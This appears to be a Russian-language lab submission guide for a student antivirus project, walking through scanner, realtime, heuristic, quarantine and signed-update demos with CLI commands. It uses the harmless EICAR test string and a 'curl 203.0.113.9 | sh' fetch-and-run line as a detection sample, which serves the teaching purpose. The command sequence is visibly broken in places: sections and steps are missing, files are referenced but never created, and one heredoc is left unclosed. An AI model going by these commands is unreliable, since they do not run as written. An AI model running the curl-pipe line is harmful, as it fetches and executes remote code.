# Туториал для сдачи: VirusWall (лабораторные №3–6, курс «БИ» / т. 2.1)

Короткая шпаргалка: какие файлы относятся к какой лабораторной, какие тесты её покрывают и какие команды показать преподавателю. Все команды выполняются из корня репозитория.

## 0. Подготовка (один раз, до сдачи)

```bash
git clone <репозиторий> && cd virus      # или скопировать каталог
python3 -m venv .venv
.venv/bin/pip install -e .
.venv/bin/pip install pytest psutil scapy cryptography PySide6-Essentials watchdog
```

Проверка здоровья перед сдачей (полезно показать первой):

```bash
.venv/bin/python -m pytest -q             # 51 passed
.venv/bin/python -m viruswall doctor      # самотестирование
.venv/bin/python -m viruswall status      # статус модулей
```

Важно о каталоге данных (в каждой команде ниже):

- по умолчанию данные хранятся в `~/.viruswall`; для демо проще использовать явный каталог;
  в начале каждого терминала выполните:

  ```bash
  export DATA_DIR=/tmp/vwdemo-data
  mkdir -p "$DATA_DIR"
  ```

- после этого все команды идут через `--data-dir "$DATA_DIR"`;
- **одиночность экземпляра**: пока одна команда работает (например `realtime`), любая вторая команда
  с тем же `--data-dir` получает ошибку «VirusWall уже запущен для этого каталога данных» — это
  самозащита (lock-файл, Ф-25), а не сбой. Демо-команды после `realtime` выполняются после Ctrl+C.

Всё, что демонстрируется, автоматически журналируется: журнал (`events.jsonl`) — «протокол» ваших действий с хеш-цепочкой.

## 2. Лабораторная №3 — Сигнатурный анализ и файловый сканер (Ф-04, Ф-10)

**Файлы:** `signatures.py`, `scanner.py`, `models.py`, `config.py` (исключения), `cli.py`.
**Тесты:** `tests/test_lab3.py` (CRUD сигнатур/шаблонов, MD5, рекурсивный обход с исключениями, большой файл, ошибки доступа, пропускная способность, восстановление базы из копии).

### Демо

```bash
# 1) Создать тестовый «вредоносный» файл (EICAR — стандартная тестовая строка, безвредный текст)
mkdir -p /tmp/vwdemo/webdir
printf 'X5O!P%%@AP[4\\PZX54(P^)7CC)7}$EICAR-STANDARD-ANTIVIRUS-TEST-FILE!$H+H*' > /tmp/vwdemo/eicar.com
printf 'Просто текстовый файл без подозрений.\n' > /tmp/vwdemo/clean.txt

# 2) Показать стартовую базу (EICAR присутствует по умолчанию)
.venv/bin/python -m viruswall --data-dir "$DATA_DIR" signature list | head -5

# 3) Скан одиночного файла и каталога + отчёт TXT (Ф-21)
#    в findings: {"source": "signature", "name": "EICAR-Test-File", "risk": "high"}
.venv/bin/python -m viruswall --data-dir "$DATA_DIR" scan /tmp/vwdemo/eicar.com
.venv/bin/python -m viruswall --data-dir "$DATA_DIR" scan /tmp/vwdemo --report /tmp/vwdemo/report.txt
cat /tmp/vwdemo/report.txt    # «ОТЧЁТ О СКАНИРОВАНИИ — VirusWall», формат Г.6 ТЗ

# 4) Добавить байтовый шаблон (4–128 байт, hex) по первому маркеру и подтвердить детект
.venv/bin/python -m viruswall --data-dir "$DATA_DIR" signature add-pattern "6375726C203230332E302E3131332E39207C207368" Lab.CurlPipeSh
printf 'curl 203.0.113.9 | sh' > /tmp/vwdemo/susp.sh
.venv/bin/python -m viruswall --data-dir "$DATA_DIR" scan /tmp/vwdemo/susp.sh
#   → status "threat", threat_name "Lab.CurlPipeSh"

# 5) Добавить хэш-сигнатуру вручную: SHA-256 (+MD5)
printf 'binary malware payload marker' > /tmp/vwdemo/bin.smpl
SHA=$(sha256sum /tmp/vwdemo/bin.smpl | cut -d" " -f1)
MD5=$(md5sum /tmp/vwdemo/bin.smpl | cut -d" " -f1)
.venv/bin/python -m viruswall --data-dir "$DATA_DIR" signature add "$SHA" Lab.ManualSample --md5 "$MD5"
.venv/bin/python -m viruswall --data-dir "$DATA_DIR" scan /tmp/vwdemo/bin.smpl
#   → статус "threat", threat_name Lab.ManualSample

# 6) Отказоустойчивость БД: испортить базу — автоматический откат из резервной копии
echo '{broken' > "$DATA_DIR/signatures.json"
.venv/bin/python -m viruswall --data-dir "$DATA_DIR" status
#   → "database_recovered_from_backup": true, база откатилась (сигнатуры/шаблоны сохранены)
.venv/bin/python -m viruswall --data-dir "$DATA_DIR" signature list
```

## 3. Лабораторная №4 — Защита в реальном времени, эвристика, процессы (Ф-09, Ф-11, Ф-12, Ф-24)

**Файлы:** `realtime.py`, `filesystem.py`, `heuristic.py`, `behavior.py`, `config.py` (`realtime`, `behavior_templates`, `exclusions`), `cli.py`.
**Тесты:** `tests/test_lab4.py`, `tests/test_lab4_realtime.py` (политики, `arm`, дедупликация, templates, fallback, маски `*.pdf.exe`).

### Демо

```bash
# 0) Политика реакции задана в config.json → раздел realtime.action_on_detection:
#    "notify" (по умолчанию) или "quarantine" — автокарантин при взводе --arm.
#    Политически корректное переключение — через приложение (сохранение с подтверждением
#    целостности), поэтому:
.venv/bin/python - <<'EOF'
from viruswall.core import VirusWall
import os
app = VirusWall(os.environ["DATA_DIR"])
app.config.realtime["action_on_detection"] = "quarantine"
app.save_config()
print("политика:", app.config.realtime["action_on_detection"])
EOF

# 1) Защита в реальном времени: наблюдение + автокарантин после arm
#    Терминал держит lock каталога данных — демо-запросы (п. 3–4) выполнять после Ctrl+C.
.venv/bin/python -m viruswall --data-dir "$DATA_DIR" realtime /tmp/vwdemo/webdir --arm
#    (пока работает): во втором терминале →
cp /tmp/vwdemo/eicar.com /tmp/vwdemo/webdir/injected.eicar
#    остановить realtime (Ctrl+C), затем:

# 2) Реакция в журнале: честная метрика времени в миллисекундах (reaction_ms)
.venv/bin/python -m viruswall --data-dir "$DATA_DIR" events --type realtime_detection | tail -40
#   → event_type "realtime_detection", details.reaction_ms ≈ 250–270 мс (требование ≤500 мс)
.venv/bin/python -m viruswall --data-dir "$DATA_DIR" quarantine list
#   → EICAR уже в карантине (политика quarantine + взвод --arm)

# Резервный backend (без watchdog): команда watch печатает события как JSON-строки
.venv/bin/python -m viruswall --data-dir "$DATA_DIR" watch /tmp/vwdemo/webdir --interval 1

# 3) Эвристика: двойное расширение и PE-подобное содержимое
printf 'MZ fake payload' > /tmp/vwdemo/doc.pdf.exe
.venv/bin/python -m viruswall --data-dir "$DATA_DIR" scan /tmp/vwdemo/doc.pdf.exe
#   → status "suspicious", findings источник "heuristic" (Heuristic.Suspicious)

# 4) Снимок процессов (psutil) — база для поведенческих цепочек «родитель→потомок»
.venv/bin/python -m viruswall --data-dir "$DATA_DIR" processes | head -30
#   → поля pid, ppid, name, exe, created_at, observed_at

# 5) Исключения: пути и маски (fnmatch), работают и в сканере, и в RT
.venv/bin/python -m viruswall --data-dir "$DATA_DIR" exclude "/tmp/vwdemo/*.smpl"
.venv/bin/python -m viruswall --data-dir "$DATA_DIR" scan /tmp/vwdemo/bin.smpl
#   → статус excluded

# 6) Чувствительность эвристики (5 уровней)
.venv/bin/python -m viruswall --data-dir "$DATA_DIR" sensitivity 5
```

Мониторинг сетевых потоков (`connections`, `flows`, `interfaces`) — в лаб. №5; realtime-монитор использует watchdog, если библиотека установлена, иначе резервный опрос (`realtime.py`).

### Демо

```bash
# 1) Пассивная статистика (не требует root)
.venv/bin/python -m viruswall --data-dir "$DATA_DIR" interfaces
.venv/bin/python -m viruswall --data-dir "$DATA_DIR" connections | head -10

sudo .venv/bin/python -m viruswall --data-dir "$DATA_DIR" capture eth0 --count 20 --timeout 5

# 3) Разбор сохранённого PCAP (основной способ, без root)
#    сгенерировать синтетический PCAP скриптом (см. tests/test_lab5_pcap.py) или взять любой
```

## 5. Лабораторная №6 — Реагирование, карантин, обновления, самозащита, комплексные испытания (Ф-13…Ф-25, раздел 10.2 ТЗ)

**Файлы:** `quarantine.py`, `events.py`, `updates.py`, `selfprotect.py`, `core.py`, `report.py`, `config.py`, `cli.py`.
**Тесты:** `tests/test_lab6.py` (интеграция), `tests/test_lab6_security.py` (хеш-цепочка, лимиты, перезапись, restore+rescan, подписи Ed25519, tamper, doctor, TXT, полный сценарий 10.2).

### Демо

```bash

printf 'X5O!P%%@AP[4\\PZX54(P^)7CC)7}$EICAR-STANDARD-ANTIVIRUS-TEST-FILE!$H+H*' > /tmp/vwdemo/sampleA.bin

.venv/bin/python -m viruswall --data-dir "$DATA_DIR" quarantine put /tmp/vwdemo/sampleB.bin --name Lab.Cleanup --yes --remove-original
.venv/bin/python -m viruswall --data-dir "$DATA_DIR" quarantine list
ID_A=$( .venv/bin/python -m viruswall --data-dir "$DATA_DIR" quarantine list \
        | python3 -c "import sys,json; q=json.load(sys.stdin); print([x['id'] for x in q if x['threat_name']=='Lab.E2E'][0])" )
ID_B=$( .venv/bin/python -m viruswall --data-dir "$DATA_DIR" quarantine list \
        | python3 -c "import sys,json; q=json.load(sys.stdin); print([x['id'] for x in q if x['threat_name']=='Lab.Cleanup'][0])" )

# 2) Восстановление с повторным сканированием; запись остаётся с меткой restored
.venv/bin/python -m viruswall --data-dir "$DATA_DIR" quarantine restore "$ID_A" --yes --target /tmp/vwdemo/restored
.venv/bin/python -m viruswall --data-dir "$DATA_DIR" quarantine list | grep restored
# повторный restore того же id отклоняется: «Ошибка: Объект уже был восстановлен»;
# restore в уже существующий путь также отклоняется

#   → JSON {"deleted": {id, original_path, threat_name, …}}

#   → checks: dependencies, realtime_native_backend, password_dir_permissions,
#     quarantine_key, journal_integrity, database_loadable, database_recovered, disk_space

# Единственность экземпляра: в одном терминале запустить realtime, во втором — любой `status`
#   → «VirusWall уже запущен для этого каталога данных»

# 8) tamper-детект: изменить config.json ВНЕ приложения и проверить событие в журнале
python3 - <<'EOF'
```

### Сценарий обновлений: подготовка демонстрационных файлов

```bash
.venv/bin/python - <<'EOF'
from viruswall.updates import generate_keypair, sign_manifest
from viruswall.core import VirusWall
import os, json

public, private = generate_keypair()

# Манифест: словарь сигнатур по sha256 + список байтовых шаблонов; подпись Ed25519
manifest = {
    "signatures": {
        "a" * 64: {"name": "Demo.Threat", "category": "test"}
    },
    "patterns": [
        {"pattern": "6a616e6b2054656373742032363030", "name": "Demo.Pattern", "category": "test"}
    ],
}
open("/tmp/vwdemo/good_update.json", "wb").write(json.dumps(sign_manifest(manifest, private)).encode())
open("/tmp/vwdemo/bad_update.json", "wb").write(json.dumps(sign_manifest(manifest, "11" * 32)).encode())

# Открытый ключ вписывается в конфигурацию через приложение (updates.public_key):
app = VirusWall(os.environ["DATA_DIR"])
app.config.updates["public_key"] = public
app.save_config()
print("готово: /tmp/vwdemo/good_update.json, /tmp/vwdemo/bad_update.json; ключ назначен")
EOF
```

Не забыть защитить ключ: закрытый ключ Ed25519 остаётся у «производителя»; учебная реализация демонстрирует только «валидность/повреждённость» подписи.

## 6. Комплексный порядок демонстрации (10–15 минут)

1. Статус и самотестирование: `status`, `doctor` — модули работают, все проверки «ok».
2. **Лаб. №3:** EICAR-файл → `scan` файла и каталога → `report.txt` → добавление шаблона `add-pattern` → повторный скан.
3. **Лаб. №4:** переключить политику `quarantine` → `realtime --arm` → подсунуть EICAR в каталог наблюдения → Ctrl+C → `events --type realtime_detection` и `quarantine list` показывают автоматическую реакцию (`reaction_ms` в журнале); потом `doc.pdf.exe` (эвристика) и `exclude`.
4. **Лаб. №5:** `interfaces` / `connections` / `flows` / `pcap` (синтетический dump) → события сети в журнале.
5. **Лаб. №6:** `quarantine put/restore/delete/purge` → `events --verify` → подготовить и применить update (валидный/повреждённый) → `doctor` и tamper-детект (правка config.json вне приложения → `events --type tamper_detected`).
6. Тесты: `.venv/bin/python -m pytest -q` → **51 passed**; трассируемость требований — `COVERAGE.md` (каждое Ф-xx: статус + тест).

## 7. Числа для доклада

- Отчёты: JSON, CSV, TXT (TXT — формат Г.6 ТЗ, Ф-21).
- Тесты: **51** (lab3: 9, lab4: 9+9, lab5: 6+5, lab6: 6+12 — см. TESTING.md).

Если преподаватель спросит «а почему нет демона/драйвера и блокировки записи?» — показать `COVERAGE.md` (статусы частично/не реализовано) и `ARCHITECTURE.md` § 2.2: системная служба и драйвер — зафиксированная граница учебной версии; RT работает через watchdog и автокарантин по политике «взвод» (`--arm`).
